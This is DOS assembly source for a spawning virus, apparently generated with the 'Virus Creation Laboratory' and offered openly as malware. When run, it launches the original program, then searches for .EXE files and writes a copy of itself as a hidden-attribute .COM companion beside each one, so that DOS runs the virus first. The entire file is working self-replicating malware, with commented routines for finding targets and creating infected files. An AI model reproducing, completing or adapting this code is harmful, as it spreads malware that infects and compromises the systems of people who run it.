;SPAWN.ASM
;Created with Nowhere Man's Virus Creation Laboratory v1.00
;Written by Turtle Brain

virus_type      equ     2                       ;Spawning Virus
is_encrypted    equ     0                       ;We're not encrypted
tsr_virus       equ     0                       ;We're not TSR

code            segment byte public
                assume  cs:code,ds:code,es:code,ss:code
                org     0100h

start           label   near

;*****************************************************************************
;This is the main control routine of the virus.
main            proc    near

                mov     ah,04Ah                 ;DOS resize memory function
                mov     bx,(finish - start) / 16 + 0272h  ;BX holds # of para.
                int     021h                    ;why 272H ?? I don't know

                mov     sp,(finish - start) + 01100h  ;Change top of stack

                mov     si,offset spawn_name    ;SI points to true filename
                int     02Eh                    ;DOS execution back-door
                push    ax                      ;Save return value for later

                mov     ax,cs                   ;AX holds code segment
                mov     ds,ax                   ;Restore data segment
                mov     es,ax                   ;Restore extra segment

                call    search_files            ;Find and infect a file

                pop     ax                      ;AL holds return value
                mov     ah,04Ch                 ;DOS terminate function
                int     021h
main            endp

;*****************************************************************************
;This routine searches for EXE's and infects them.

search_files    proc    near
                mov     dx,offset exe_mask      ;DX points to "*.EXE"
                call    find_files              ;Try to infect a file
done_searching: ret                             ;Return to caller

exe_mask        db      "*.EXE",0               ;Mask for all .EXE files
search_files    endp

find_files      proc    near
                push    bp                      ;Save BP

                mov     ah,02Fh                 ;DOS get DTA function
                int     021h
                push    bx                      ;Save old DTA address

                mov     bp,sp                   ;BP points to local buffer
                sub     sp,128                  ;Allocate 128 bytes on stack

                push    dx                      ;Save file mask
                mov     ah,01Ah                 ;DOS set DTA function
                lea     dx,[bp - 128]           ;DX points to buffer
                int     021h

                mov     ah,04Eh                 ;DOS find first file function
                mov     cx,00100111b            ;CX holds all file attributes
                pop     dx                      ;Restore file mask
find_a_file:    int     021h
                jc      done_finding            ;Exit if no files found
                call    infect_file             ;Infect the file!
                jnc     done_finding            ;Exit if no error
                mov     ah,04Fh                 ;DOS find next file function
                jmp     short find_a_file       ;Try finding another file

done_finding:   mov     sp,bp                   ;Restore old stack frame
                mov     ah,01Ah                 ;DOS set DTA function
                pop     dx                      ;Retrieve old DTA address
                int     021h

                pop     bp                      ;Restore BP
                ret                             ;Return to caller
find_files      endp

;*****************************************************************************
;This routine infects the file specified in the DTA search block, if it can,
;and returns with C set if it could not infect.
infect_file     proc    near
                mov     ah,02Fh                 ;DOS get DTA address function
                int     021h
                mov     di,bx                   ;DI points to the DTA

                lea     si,[di + 01Eh]          ;SI points to file name
                mov     dx,si                   ;DX points to file name, too
                mov     di,offset spawn_name + 1;DI points to new name
                xor     ah,ah                   ;AH holds character count
transfer_loop:  lodsb                           ;Load a character
                or      al,al                   ;Is it a NULL?
                je      transfer_end            ;If so then leave the loop
                inc     ah                      ;Add one to the character count
                stosb                           ;Save the byte in the buffer
                jmp     short transfer_loop     ;Repeat the loop
transfer_end:   mov     byte ptr [spawn_name],ah;First byte holds char. count
                mov     byte ptr [di],13        ;Make CR the final character

                mov     di,dx                   ;DI points to file name
                xor     ch,ch                   ;
                mov     cl,ah                   ;CX holds length of filename
                mov     al,'.'                  ;AL holds char. to search for
        repne   scasb                           ;Search for a dot in the name
                mov     word ptr [di],'OC'      ;Store "CO" as first two bytes
                mov     byte ptr [di + 2],'M'   ;Store "M" to make "COM"

                mov     byte ptr [set_carry],0  ;Assume we'll fail
                mov     ax,03D00h               ;DOS open file function, r/o
                int     021h
                jnc     infection_done          ;File already exists, so leave
                mov     byte ptr [set_carry],1  ;Success -- the file is OK

                mov     ah,03Ch                 ;DOS create file function
                mov     cx,00100111b            ;CX holds file attributes (all)
                int     021h
                xchg    bx,ax                   ;BX holds file handle

                mov     ah,040h                 ;DOS write to file function
                mov     cx,finish - start       ;CX holds virus length
                mov     dx,offset start         ;DX points to start of virus
                int     021h

                mov     ah,03Eh                 ;DOS close file function
                int     021h

infection_done: cmp     byte ptr [set_carry],1  ;Set carry flag if failed
                ret                             ;Return to caller

;*****************************************************************************
;Data area. Spawn name is the EXE file name, formatted for a DOS Int 2E.
;Int 2E passes a command to COMMAND.COM. The format of the command is:
;1 byte which specifies the length of the command, in bytes, then the command,
;in ASCII format, terminated by a carriage return (13).
spawn_name      db      12,12 dup (?),13        ;Name for next spawn
set_carry       db      ?                       ;Set-carry-on-exit flag
infect_file     endp


vcl_marker      db      "[VCL]",0               ;VCL creation marker

finish          label   near

code            ends
                end     main
                